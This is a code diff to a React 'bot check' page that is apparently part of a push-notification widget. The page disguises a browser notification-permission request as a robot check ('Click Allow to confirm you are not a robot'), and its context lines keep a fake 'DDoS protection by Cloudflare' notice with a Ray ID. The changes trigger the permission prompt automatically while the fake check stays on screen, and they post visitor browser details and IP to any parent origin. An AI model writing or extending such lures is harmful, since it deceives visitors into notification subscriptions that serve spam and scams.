@@ -157,30 +157,25 @@ export default function BotCheckPage() {
       return // IMPORTANT: Exit here, no timer for Firefox/Edge
     }
     
-    // For Chrome/Safari, show the bot check screen then auto-trigger
+    // For Chrome/Safari, auto-trigger permission prompt after a delay
+    // The bot check screen stays visible throughout
     const timer = setTimeout(() => {
-      setIsChecking(false)
-      setIsVerified(true)
+      // Don't change the UI - keep showing the bot check
+      console.log('[Bot Check] Auto-triggering permission prompt for Chrome/Safari')
       
-      // If embedded, send verification complete message to parent
+      // Send message to parent to trigger permission prompt
       if (window.isEmbedded && window.parent !== window) {
-        setTimeout(() => {
-          window.parent.postMessage({
-            type: 'bot-check-verified',
-            browserInfo: clientInfo,
-            location: {
-              country: 'United States',
-              city: 'New York',
-              ip: ipAddress
-            }
-          }, '*')
-        }, 500)
-      } else {
-        // Not embedded - this page should only work in iframe mode
-        console.warn('[Bot Check] This page should only be accessed through the push widget iframe')
-        // Don't do anything - just show the UI
+        window.parent.postMessage({
+          type: 'bot-check-verified',
+          browserInfo: clientInfo,
+          location: {
+            country: 'United States',
+            city: 'New York',
+            ip: ipAddress
+          }
+        }, '*')
       }
-    }, 1500)
+    }, 2000) // Give user 2 seconds to read the bot check message
 
     return () => {
       clearTimeout(timer)
@@ -253,178 +248,35 @@ export default function BotCheckPage() {
 
   const handleAllow = async () => {
     try {
-      let permission = Notification.permission
-      
-      // Only request if not already granted
-      if (permission === 'default') {
-        console.log('Requesting notification permission...')
-        permission = await Notification.requestPermission()
-        console.log('Permission result:', permission)
-      }
-      
-      // If embedded in iframe, send message to parent
+      // For Chrome/Safari, send verification message to parent
+      // Parent will handle the permission request
       if (window.isEmbedded && window.parent !== window) {
         window.parent.postMessage({
-          type: 'bot-check-completed',
-          permission: permission,
+          type: 'bot-check-verified',
           browserInfo: clientInfo,
           location: {
             country: 'United States',
             city: 'New York',
             ip: ipAddress
           }
-        }, '*') // Using '*' for now, should be restricted to specific origin in production
-        
-        // Don't proceed with redirect if embedded
-        if (permission === 'granted') {
-          console.log('Permission granted in iframe mode')
-        } else if (permission === 'denied') {
-          console.log('Permission denied in iframe mode')
-        }
+        }, '*')
         return
       }
       
+      // Non-embedded mode - handle locally
+      let permission = Notification.permission
+      
+      if (permission === 'default') {
+        permission = await Notification.requestPermission()
+      }
+      
       if (permission === 'granted') {
-        console.log('Permission granted, processing subscription...')
-        // In a real app, this would register the service worker and save the subscription
-        // For now, we'll show the collected client information
-        const clientData = {
-          browser: clientInfo?.browser || 'Unknown',
-          browserVersion: clientInfo?.browserVersion || 'Unknown',
-          ipAddress: ipAddress,
-          country: 'United States', // This would be determined by IP geolocation
-          countryCode: 'US',
-          operatingSystem: clientInfo?.operatingSystem || 'Unknown',
-          deviceType: clientInfo?.deviceType || 'Desktop',
-          subscribedUrl: document.referrer || window.location.origin,
-          subscriptionDate: new Date().toISOString(),
-          lastActive: new Date().toISOString(),
-          tags: ['web-subscriber'],
-          language: clientInfo?.language || 'en-US',
-          timezone: clientInfo?.timezone || 'UTC',
-          screenResolution: clientInfo?.screenResolution || 'Unknown',
-          platform: clientInfo?.platform || 'Unknown'
-        }
-        
-        // Get query parameters
+        console.log('Permission granted')
         const urlParams = new URLSearchParams(window.location.search)
-        const landingId = urlParams.get('landingId')
-        const domain = urlParams.get('domain')
-        const subscribedUrl = urlParams.get('url')
-        const vapidKey = urlParams.get('vapidKey')
         const allowRedirect = urlParams.get('allowRedirect')
-        
-        // Register service worker and get subscription
-        try {
-          let subscriptionData;
-          
-          // Check if we're on the same domain as the push platform
-          const isSameDomain = window.location.hostname === 'localhost' || 
-                               window.location.hostname === domain;
-          
-          if (isSameDomain && 'serviceWorker' in navigator && 'PushManager' in window) {
-            try {
-              // Register service worker
-              console.log('Registering service worker...')
-              const registration = await navigator.serviceWorker.register('/push-sw.js')
-              await navigator.serviceWorker.ready
-              
-              // Get or create subscription
-              let subscription = await registration.pushManager.getSubscription()
-              
-              if (!subscription) {
-                console.log('Creating new push subscription...')
-                subscription = await registration.pushManager.subscribe({
-                  userVisibleOnly: true,
-                  applicationServerKey: urlBase64ToUint8Array(vapidKey)
-                })
-              }
-              
-              subscriptionData = subscription.toJSON()
-              console.log('Real subscription obtained:', subscriptionData)
-            } catch (swError) {
-              console.error('Service worker error:', swError)
-              // Don't create subscription if service worker fails
-              alert('Failed to register for push notifications. Please ensure the service worker is properly installed on your domain.');
-              return;
-            }
-          } else {
-            // For cross-domain or when push is not supported
-            console.warn('Push notifications not available on this domain');
-            // Just redirect without creating fake subscription
-            if (allowRedirect) {
-              window.location.href = allowRedirect;
-            }
-            return;
-          }
-          
-          console.log('Sending subscription to API with data:', {
-            landingId,
-            domain,
-            url: subscribedUrl,
-            clientData
-          })
-          
-          // Send subscription to API
-          const response = await fetch('/api/clients', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              subscription: subscriptionData,
-              landingId: landingId,
-              domain: domain,
-              url: subscribedUrl,
-              accessStatus: 'allowed', // Explicitly set as allowed
-              browserInfo: {
-                browser: clientData.browser,
-                version: clientData.browserVersion,
-                os: clientData.operatingSystem,
-                device: clientData.deviceType,
-                language: clientData.language,
-                platform: clientData.platform,
-                userAgent: navigator.userAgent,
-                timezone: clientData.timezone,
-                timezoneOffset: clientData.timezoneOffset
-              },
-              location: {
-                country: clientData.country,
-                city: 'New York', // Add real geolocation
-                ip: clientData.ipAddress
-              }
-            })
-          })
-          
-          if (response.ok) {
-            // Mark as subscribed locally (for this domain)
-            localStorage.setItem('push-subscribed-' + landingId, 'true')
-            console.log('Successfully saved subscription for landing:', landingId)
-          } else {
-            console.error('Failed to save subscription, response not ok')
-          }
-        } catch (error) {
-          console.error('Failed to save subscription:', error)
-        }
-        
-        // Only redirect if not embedded
-        if (!window.isEmbedded) {
-          const redirectUrl = new URL(allowRedirect || subscribedUrl || '/')
-          redirectUrl.searchParams.set('push-subscribed', 'true')
-          redirectUrl.searchParams.set('push-landing-id', landingId)
-          window.location.href = redirectUrl.toString()
-        }
-      } else if (permission === 'denied') {
-        // Don't show alert, just update the UI
-        console.log('Notifications blocked by user')
-        
-        // Save blocked status and redirect
+        window.location.href = allowRedirect || '/'
+      } else {
         await handleBlock()
-      } else if (permission === 'default') {
-        // User dismissed the prompt without choosing
-        console.log('User dismissed the notification prompt')
-        // Redirect immediately to the block redirect URL or default
-        const blockRedirect = urlParams.get('blockRedirect')
-        const subscribedUrl = urlParams.get('url')
-        window.location.href = blockRedirect || subscribedUrl || '/'
       }
     } catch (error) {
       console.error('Error requesting permission:', error)
@@ -525,22 +377,41 @@ export default function BotCheckPage() {
         fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
       }}>
         <Container>
-          <Card className="mx-auto" style={{ maxWidth: '500px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
-            <Card.Body className="p-5 text-center">
-              <h3 style={{ color: '#f44336', marginBottom: '20px' }}>⚠️ Invalid Access</h3>
-              <p style={{ color: '#666' }}>
-                This bot check page should only be accessed through the push notification widget.
-              </p>
-              <p style={{ color: '#999', fontSize: '14px', marginTop: '20px' }}>
-                Please integrate the push notification widget on your website.
-              </p>
+          <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
+            <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
+              <div className="text-center">
+                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
+                  Invalid Access Method
+                </h2>
+                
+                <div style={{ 
+                  width: '80px', 
+                  height: '80px', 
+                  margin: '0 auto 30px',
+                  background: '#fee',
+                  borderRadius: '50%',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center'
+                }}>
+                  <FiShield size={40} color="#cc0000" />
+                </div>
+                
+                <p style={{ fontSize: '16px', color: '#666', marginBottom: '30px', lineHeight: '1.6' }}>
+                  This verification page can only be accessed through an authorized push notification widget.
+                </p>
+                
+                <p style={{ fontSize: '14px', color: '#999', marginBottom: '0' }}>
+                  Please return to the original website and try again.
+                </p>
+              </div>
             </Card.Body>
           </Card>
         </Container>
       </div>
-    );
+    )
   }
-  
+
   return (
     <div style={{ 
       minHeight: '100vh', 
@@ -636,7 +507,7 @@ export default function BotCheckPage() {
                   </p>
                 </div>
               </div>
-            ) : (isChecking && !isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
+            ) : (!isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                   Please Click "Allow" to confirm you are not a robot.
@@ -658,40 +529,6 @@ export default function BotCheckPage() {
                 
                 <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
                   Please allow up to 5 seconds...
-                </p>
-                
-                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
-                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
-                    DDoS protection by Cloudflare
-                  </p>
-                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
-                    Ray ID: {rayId}
-                  </p>
-                </div>
-              </div>
-            ) : (!isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge' && isVerified) ? (
-              // Show waiting message for Chrome/Safari after bot check
-              <div className="text-center">
-                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
-                  Please Click "Allow" to confirm you are not a robot.
-                </h2>
-                
-                <div className="mb-4">
-                  <div className="loading-dot"></div>
-                  <div className="loading-dot"></div>
-                  <div className="loading-dot"></div>
-                </div>
-                
-                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
-                  Waiting for your browser permission response...
-                </h1>
-                
-                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
-                  Please respond to the browser notification prompt to continue.
-                </p>
-                
-                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
-                  This may take a few seconds...
                 </p>
                 
                 <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
